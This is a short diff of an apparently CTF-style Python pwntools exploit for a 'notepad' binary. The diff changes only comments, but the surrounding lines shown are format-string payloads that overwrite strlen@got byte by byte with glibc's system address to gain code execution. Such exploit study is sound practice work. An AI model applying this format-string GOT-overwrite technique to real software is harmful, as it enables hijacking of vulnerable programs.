@@ -53,10 +53,10 @@ e = ELF('./notepad_patched')
 glibc_e = ELF('./libc.so.6')
 # only need to overwrite last three bytes of strlen@got with glibc system address
 for i in range(3):
-    # 26th argument of printf is vuln return address, overwrite value it points to with strlen@got including offset
+    # 26th argument of printf is vuln return address, overwrite value it points to with correct offset byte of strlen@got 
     edit_note(1, f'%{(elf_base_addr+e.got.strlen+i)&0xffff}c%26$hn'.encode())
     print_note(1)
-    # 27th argument of printf is strlen@got including offset, overwrite value it points to with glibc system address including offset
+    # 27th argument of printf is strlen@got including offset, overwrite value it points to with correct byte of glibc system address
     edit_note(1, f'%{(glibc_base_addr+glibc_e.sym.system)>>(8*i)&0xff}c%27$hhn'.encode())
     print_note(1)
 
